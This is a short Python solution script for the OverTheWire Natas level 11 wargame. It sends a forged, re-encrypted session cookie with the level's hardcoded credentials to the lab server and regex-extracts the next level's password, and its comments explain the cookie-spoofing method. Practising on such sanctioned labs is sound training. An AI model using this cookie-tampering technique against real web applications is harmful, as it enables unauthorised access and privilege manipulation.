#!/bin/python3

import requests
import re
import html.parser
from encode_cookie_11 import excookie 

username = 'natas11'
password = 'U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK'
cookie = { "data" :excookie}

url = 'http://%s.natas.labs.overthewire.org' % (username)
data = { "bgcolor" : "#ffffff" ,"submit" : "Set color" }

#for communicating with the website whilst maintaining session history
session = requests.Session()
#cookie = session.cookie
response = session.post(url + '',data = data,cookies = cookie, auth = (username,password) )
content = html.unescape(response.text)

#for viewing the webpage
#print (content)

#for finding the password 
print (re.findall('The password for natas12 is (.*)<br>',content)[0])

#cookie = ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D 

#the process behind this one is mostly contained in the php script 
#a session cookie was sent on first connection with the page 
#after retreiving this cookie it is passed through an encryption function
#and compared with a json formatted array to change a variable
#a spoofed cookie is generated and sent back to retrieve the password
